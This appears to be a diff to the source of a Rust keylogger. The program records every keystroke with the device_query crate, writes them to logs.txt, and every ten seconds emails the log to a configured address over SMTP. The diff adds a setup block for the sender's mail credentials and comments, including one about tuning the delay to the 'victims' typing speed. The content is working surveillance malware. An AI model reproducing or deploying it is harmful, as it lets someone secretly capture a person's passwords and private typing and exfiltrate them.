@@ -1,29 +1,29 @@
-use std::fs::{self, File};
-use std::{io::{self, Write}, process::Command, thread, time::{Duration, SystemTime}};
-use std::io::prelude::*;
+use std::fs;
+use std::{io::{self, Write}, thread, time::{Duration, SystemTime}};
 use device_query::{DeviceQuery, DeviceState, Keycode};
 use chrono::Utc;
-use lettre_email::{Email, EmailBuilder};
+use lettre_email::Email;
 use lettre::smtp::authentication::Credentials;
-use lettre::{SmtpClient, SmtpTransport, Transport};
+use lettre::{SmtpClient, Transport};
 use std::path::Path;
 use tokio::task;
 
 #[tokio::main]
 async fn main() {
+    // Set up your email stuff here:
+    let to_mail_address = "your mail here";
+    let from_mail_address = "mail you will be sending from";
+    let from_mail_address_password = "onetime-app-password";
+
+    //rest of setup
     let file_name: &str = "logs.txt";
     let mut log_content = String::from("");
-    let mut log_content_addon = String::from("");
+    let mut log_content_addon;
     let device_state = DeviceState::new();
     let now = Utc::now();
     let date = now.to_rfc2822();
     let mut sys_time = SystemTime::now();
     let mail_sending_interval = Duration::from_secs(10);
-
-    // Set up your email stuff here:
-    let to_mail_address = "your email";
-    let from_mail_address = to_mail_address;
-    let from_mail_address_password = "one time password";
     
     loop {
         loop {
@@ -35,7 +35,7 @@ async fn main() {
                 let from = from_mail_address.to_string();
                 let pass = from_mail_address_password.to_string();
 
-                // Spawn a separate task for email sending
+                // Runs email sending parallel to the rest of the code
                 task::spawn(async move {
                     send_mail(&to, &from, &pass, &email_content).await;
                 });
@@ -43,18 +43,20 @@ async fn main() {
                 sys_time = SystemTime::now(); // Reset the timer
             }
             
+            // break once you have a keyinput
             if !keys.is_empty(){
                 log_content_addon = keys[0].to_string().to_lowercase();
                 break;
             }
         }
 
+        // writing the new string to txt
         log_content = log_content.to_owned() + "-" + &log_content_addon;
         match write_to_file(file_name, &log_content) {
             Ok(_) => (),
             Err(_) => println!("couldn't write to file")
         }
-        wait_for(110);
+        wait_for(110); // key spam prevention feel free to ajust acording to "victims" typing-speed
     }
 }
 
